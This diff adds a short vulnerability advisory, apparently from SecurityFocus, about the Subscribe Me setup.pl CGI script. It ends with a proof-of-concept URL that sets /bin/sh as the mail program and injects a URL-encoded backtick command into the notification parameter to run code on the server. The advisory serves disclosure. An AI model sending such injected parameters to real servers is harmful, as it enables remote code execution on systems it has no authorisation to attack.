@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/9253/info
+
+It has been reported that the SiteInteractive Subscribe Me setup.pl script lacks sufficient sanitization on user-supplied URI parameters; an attacker may invoke this script remotely and and by passing sufficient URI parameters may influence the setup script into creating a file. This file can then be invoked to have arbitrary Perl script executed in the context of the target webserver. 
+
+http://www.example.com/cgi-bin/setup.pl?RUNINSTALLATION=yes&information=~&extension=pl&config=pl&permissions=777&os=notunixornt&perlpath=/usr/bin/perl&mailprog=/bin/sh&notific
+ation="%20.`%2F%75%73%72%2F%62%69%6E%2F%69%64%20%3E%20%69%64`
+%20."&websiteurl=evilhacker&br_username=evilhacker&session_id=0&cgipath=. 
